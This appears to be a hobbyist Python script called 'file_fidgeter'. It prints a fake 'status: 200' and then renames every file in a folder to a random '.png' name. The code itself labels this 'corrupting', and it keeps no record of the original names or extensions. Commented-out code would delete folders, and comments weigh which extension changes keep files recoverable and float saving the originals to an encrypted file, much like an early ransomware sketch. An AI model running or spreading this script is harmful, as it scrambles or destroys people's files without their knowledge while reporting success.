
import os 
import random



def file_fidgeter():
    print("status: 200")    

    # folder = input("enter the directory name: ")

    # if no name is entered, use a default dir
    # maybe dont even have an input
    # maybe it shoud all happen under the hood

    
    a = os.chdir("new")

    # b = dir(os)
    # for bb in b:
    #     print(bb)


    c = os.getcwd()
    # print(c)

    # list of all files in dir
    d = os.listdir(c)
    # print(d)




    for file in d:
    #     # dot = file.index(".")
    #     # print(dot)


    #     # deleting folders
    #     if "." not in file:
    #         os.rmdir(file)


            
    #     # random file name generation
        nums0 = str(random.randint(100, 1000))

        alpha = "abcdefghijklmnopqrstuvwxyz"
        ca = random.choice(list(alpha))
        cb = random.choice(list(alpha))
        cc = random.choice(list(alpha))

        nums1 = str(random.randint(100, 1000))

        corrupted = "-0_0-" + str(nums0) + ca + cb + cc + "_" + str(nums1) + ".png"

    #     xtnsns = ["exe", "pdf", "png", "iso", 
    #                 "ff"]


    #     # corrupting file
        os.rename(file, corrupted)


        # NOTE if the file extensions are changed to their original extensions, the files will still work
        # BUT if you add an 'exe' extension then the only file that will work if the extension is restored is a '.txt' file
        # BUT if you add an extension (not 'exe') then the file could still be recovered


        # save original file extension and maybe print then to an encrypted rext file

    print("complete!")

# end of function ================================

file_fidgeter()
